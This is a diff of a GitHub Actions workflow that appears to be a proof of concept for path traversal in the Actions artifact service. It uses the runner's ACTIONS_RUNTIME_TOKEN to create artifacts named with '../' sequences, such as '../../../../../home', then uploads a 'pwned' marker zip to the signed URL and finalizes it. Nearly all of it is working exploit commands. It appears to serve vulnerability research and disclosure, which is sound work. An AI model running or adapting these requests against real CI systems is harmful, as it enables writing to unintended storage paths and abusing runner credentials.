@@ -27,6 +27,11 @@ jobs:
           echo pwned > runner/poc.txt
           zip artifact.zip runner/poc.txt
 
+          echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+          curl  -v -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d '{ "workflowRunBackendId": "'$B1'", "workflowJobRunBackendId": "'$B2'", "name": "positive-test", "version": 4 }' "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
+          echo YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+          curl  -v -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d '{ "workflowRunBackendId": "'$B1'", "workflowJobRunBackendId": "'$B2'", "name": "../negative-test", "version": 4 }' "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
+          echo ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
           UPLOAD_URL="$(curl  -v -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d '{ "workflowRunBackendId": "'$B1'", "workflowJobRunBackendId": "'$B2'", "name": "../../../../../home", "version": 4 }' "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" | jq -r .signed_upload_url)"
           curl -X PUT --data-binary @artifact.zip -H "Content-Type: application/octet-stream" -H "x-ms-version: 2025-01-05" -H "Accept: application/xml" -H "x-ms-blob-type: BlockBlob" -H "User-Agent: azsdk-js-azure-storage-blob/12.26.0 core-rest-pipeline/1.19.0 Node/22.8.0 OS/(x64-Linux-5.10.102.1-microsoft-standard-WSL2)" -H "x-ms-client-request-id: 36478bd5-cb6a-4ddc-845e-703232ba6ea4"  "$UPLOAD_URL" -v
           curl -v -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d '{ "workflowRunBackendId": "'$B1'", "workflowJobRunBackendId": "'$B2'", "name": "../../../../../home", "size": 8 }' "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact"
